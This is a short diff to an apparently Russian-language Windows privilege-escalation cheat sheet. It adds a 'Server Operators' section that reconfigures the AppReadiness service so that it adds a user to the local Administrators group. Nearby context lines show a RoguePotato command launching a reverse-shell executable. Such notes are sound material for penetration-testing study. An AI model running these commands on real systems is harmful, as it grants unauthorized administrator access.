@@ -304,6 +304,13 @@ C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
     sc stop dns
     sc start dns
 
+# Server Operators  (почти как админ)
+
+    sc query AppReadiness и sc qc AppReadiness -----> конфигурация службы и статус
+    sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"  ---> меняем файл службы
+    sc start AppReadiness  ---> запускаем ее
+    net localgroup Administrators    ---> проверяем
+    
     
 # Подсказки для виндовс
 
